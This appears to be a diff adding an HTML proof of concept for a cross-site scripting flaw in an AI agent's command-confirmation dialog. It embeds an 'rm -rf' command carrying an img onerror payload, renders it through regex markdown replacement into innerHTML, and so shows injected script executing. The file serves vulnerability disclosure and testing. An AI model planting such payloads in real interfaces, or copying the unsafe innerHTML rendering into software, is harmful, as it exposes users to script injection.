@@ -1,0 +1,15 @@
+<!doctype html><html><body>
+<div id="root"></div>
+<script>
+// The exact string safety.get_confirmation_message() returns for run_command.
+var cmd = 'rm -rf /tmp/x <img src=x onerror="document.title=\'PWNED\';window.__PWNED=1">';
+var description = "**Execute command:**\n```\n" + cmd + "\n```\n\n**Risk Level:** HIGH\n**Reason:** Recursive or forced delete";
+// The exact four replaces from ConfirmationDialog.tsx:58-62
+var html = description
+  .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+  .replace(/```([\s\S]*?)```/g, '<pre class="bg-muted p-2 rounded text-xs">$1</pre>')
+  .replace(/`([^`]+)`/g, '<code class="bg-muted px-1 rounded">$1</code>')
+  .replace(/\n/g, '<br/>');
+document.getElementById('root').innerHTML = html; // what dangerouslySetInnerHTML does
+</script>
+</body></html>
